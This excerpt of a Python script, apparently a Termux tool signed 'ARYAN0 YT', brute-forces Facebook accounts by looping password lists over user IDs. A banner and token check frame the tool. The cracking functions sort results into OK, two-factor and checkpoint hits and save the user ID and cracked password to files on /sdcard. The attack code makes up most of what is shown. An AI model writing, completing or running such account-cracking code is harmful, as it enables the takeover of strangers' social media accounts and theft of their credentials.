...
\033[1;31m│\033[1;32m☞  \033[1;32m𝐀𝐔𝐓𝐇𝐎𝐑     \033[1;31m➟   \033[1;32mARYAN0 YT     \033[1;31m│

\033[1;31m│\033[1;32m☞  \033[1;32m𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊   \033[1;31m➟   \033[1;32mARY4N0 YT\033[1;31m     │

\033[1;31m│\033[1;32m☞  \033[1;32m𝐆𝐈𝐓𝐇𝐔𝐁    \033[1;31m ➟   \033[1;32m𝐇𝐚𝐦𝐢𝐢-𝐤𝐢𝐧𝐠-𝟎𝟔             \033[1;31m │

\033[1;31m│\033[1;32m☞  \033[1;32m𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏  \033[1;31m ➟   \033[1;32m+923168422404          \033[1;31m │

\033[1;31m│\033[1;32m☞  \033[1;32m𝐕𝐄𝐑𝐒𝐈𝐎𝐍   \033[1;31m ➟   \033[1;32m0.4                     \033[1;31m   │

\033[1;31m│\033[1;32m☞  \033[1;32m𝐘𝐎𝐔𝐓𝐔𝐁𝐄   \033[1;31m ➟   \033[1;32mIA4RR CYB3R             \033[1;31m   │
...
def my_tool_security():
    ...
    print("\t  Facebook : https://www.facebook.com/profile.php?id=100055397954138")

    print("\t  Fb page  : ARY4N0 W0RLD Hbf Cammands")

    print("\t  Github   : ARY4N0 AHMD0 IAR CYB3R)
    ...
    if f_token in my_server:
        ...
        print(" otherwise msg on this whatsapp 03168422404 \n")
...
def free1(uid,pwx,tl):
    ...
    try:
        ...
        for ps in pwx:
           ...
           "scheme": 'https',
            ...
            if 'c_user' in log_cookies:
                ...
                os.system("play-audio ARYAN_OK.mp3")

                print('\r\033[1;32m[ARYAN-OK] '+uid+' [√] '+ps+ '')

                cek_apk(session,coki)

                open('/sdcard/ARYAN-OK.txt', 'a').write(uid+' | '+ps+'\n')
                ...
                if 'Enter login code to continue' in log_cookies:
                    ...
                    os.system("play-audio ARYAN_2F.mp3")

                    print('\r\033[1;34m[ARYAN-2F] '+uid+' [~] '+ps+' ')
                    ...
                    os.system("play-audio ARYAN_CP.mp3")

                    print(f'\r\033[1;30m[ARYAN-CP] '+uid+' [×] '+ps+ ' ')
        ...
        sys.stdout.write(f'\r\33[1;37m[ARYAN🔥] [%s] \33[1;97m[OK:%s{hamii2}CP:%s]'%(loop,len(ok),len(cp))), 
        ...
        for ps in pwx:
           ...
           "scheme": 'https',
            ...
            if 'c_user' in log_cookies:
                ...
                os.system("play-audio ARYANI_OK.mp3")
        ...
        for ps in pwx:
           ...
           "scheme": 'https',
            ...
            if 'c_user' in log_cookies:
                ...
                print('\r\033[1;32m[ARYANI-OK] '+uid+' [√] '+ps+ '')

                cek_apk(session,coki)

                open('/sdcard/ARYANI-OK.txt', 'a').write(uid+' | '+ps+'\n')
                ...
                if 'Enter login code to continue' in log_cookies:
                    ...
                    os.system("play-audio ARYANI_2F.mp3")

                    print('\r\033[1;34m[ARYANI-2F] '+uid+' [~] '+ps+' ')
                    ...
                    print(f'\r\033[1;30m[ARYANI-CP] '+uid+' [×] '+ps+ ' ')

                    open('/sdcard/ARYANI-CP.txt', 'a').write(uid+' | '+ps+'\n')
...
def m(uid,pwx,tl):
    ...
    try:
        ...
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                if 'Enter login code to continue' in log_cookies:
                    ...
                    print('\r\033[1;34m[ARYANII-2F] '+uid+' [~] '+ps+' ')
                    ...
                    os.system("play-audio ARYANI_CP.mp3")
        ...
        sys.stdout.write(f'\r\33[1;37m[ARYANI 🔥] [%s] \33[1;97m[OK:%s{hamii2}CP:%s]'%(loop,len(ok),len(cp))), 
